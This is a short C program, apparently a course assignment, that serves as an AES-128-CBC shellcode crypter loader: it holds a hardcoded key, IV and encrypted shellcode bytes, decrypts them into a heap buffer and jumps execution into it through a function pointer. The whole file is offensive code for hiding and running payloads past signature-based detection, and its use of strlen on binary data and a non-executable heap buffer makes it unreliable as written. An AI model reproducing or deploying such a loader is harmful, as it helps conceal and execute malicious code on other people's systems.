#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#define CBC 1

#include "aes.h"

// AES encryption Key:
unsigned char aes_key[] =
	"\x90\x90\x90\x90\x00\x61\x73\x73\x69\x67\x6e\x6d\x65\x6e\x74\x37";

// AES Encrypted Shellcode:
unsigned char enc_shellcode[] = \
	"\x6b\x47\xaa\xa6\xb8\x90\x89\x6b\x6e\xab\x2f\xbf\x25\xc0\xdf\xf1\x99\xe6\xf4\xd1\x29\x9e\xdf\x80\xdb\x7b\x1d\x87\x4e\xc5\xe0\xad";

int main(int argc, char **argv)
{
        uint8_t iv[]  = { 0xFC, 0xBA, 0x11, 0xEF, 0x99, 0x8C, 0x1A, 0xC7, 0xEE, 0xD9, 0x51, 0x64, 0x9D, 0xFA, 0x55, 0xAA };

	unsigned char * dst_buffer = malloc(strlen(enc_shellcode));

	int (*ret)() = (int(*)())dst_buffer;

	printf("Decrypting Shellcode...\n\n");

	for (int offset=0; offset < strlen(enc_shellcode);offset+=16)
	{
		if (offset == 0)
			AES128_CBC_decrypt_buffer(dst_buffer+offset, enc_shellcode+offset, 16, aes_key, iv);
		else
			AES128_CBC_decrypt_buffer(dst_buffer+offset, enc_shellcode+offset, 16, 0, 0);
	}

	printf("Jumping execution into decrypted Shellcode...\n\n");

	ret();
	free(dst_buffer);

	return 0;
}

